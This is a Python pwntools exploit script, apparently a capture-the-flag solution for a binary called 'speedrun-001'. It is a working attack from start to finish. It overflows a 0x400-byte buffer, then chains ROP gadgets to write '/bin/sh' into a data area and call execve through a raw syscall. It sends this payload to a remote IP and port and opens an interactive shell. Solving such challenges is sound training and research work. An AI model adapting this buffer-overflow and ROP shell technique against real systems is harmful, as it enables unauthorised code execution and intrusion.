#!/usr/bin/env python3

from pwn import *

exe = ELF("./speedrun-001")

context.binary = exe

#rax is syscall number, should be 59 for execve
POP_RAX = pack(0x0000000000415664)
POP_RDI = pack(0x0000000000400686)
POP_RSI = pack(0x00000000004101f3)
POP_RDX = pack(0x00000000004498b5)

# our memory write primitive is mov qword ptr [rax], rdx
WRITE_MEM = pack(0x000000000048d251)

EXECVE_SYSCALL = pack(59)
# we have a free data area at 0x6b6000
MEMORY = pack(0x6b6000)
SYSCALL = pack(0x000000000040129c)

def conn():
    #    return gdb.debug([exe.path])
        return remote("35.162.115.111", 31337)


def main():
    r = conn()

    # good luck pwning :)
    r.send(b'A' * 0x400 +  b'\00' * 8 + 
           (POP_RAX + MEMORY) + 
           (POP_RDX + b"/bin/sh\00")+ 
           WRITE_MEM + 
           POP_RAX + EXECVE_SYSCALL + 
           POP_RDI + MEMORY + 
           POP_RSI + pack(0) +
           POP_RDX + pack(0) +
           SYSCALL)
    r.interactive()


if __name__ == "__main__":
    main()
